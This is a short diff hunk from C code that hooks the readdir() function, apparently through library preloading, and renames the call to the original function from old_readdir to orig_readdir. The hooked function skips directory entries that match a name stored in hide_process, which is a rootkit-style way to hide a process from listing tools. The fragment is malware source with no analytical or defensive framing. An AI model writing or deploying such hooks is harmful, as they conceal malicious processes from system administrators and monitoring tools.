@@ -18,7 +18,7 @@ struct dirent *readdir (DIR * dirp){
       fprintf(stderr, "Catched\n");
    }
 
-   struct dirent* ret = old_readdir(dirp);
+   struct dirent* ret = orig_readdir(dirp);
    
    while (ret != NULL && (strcmp(ret->d_name,hide_process) == 0)){
       ret = orig_readdir (dirp);
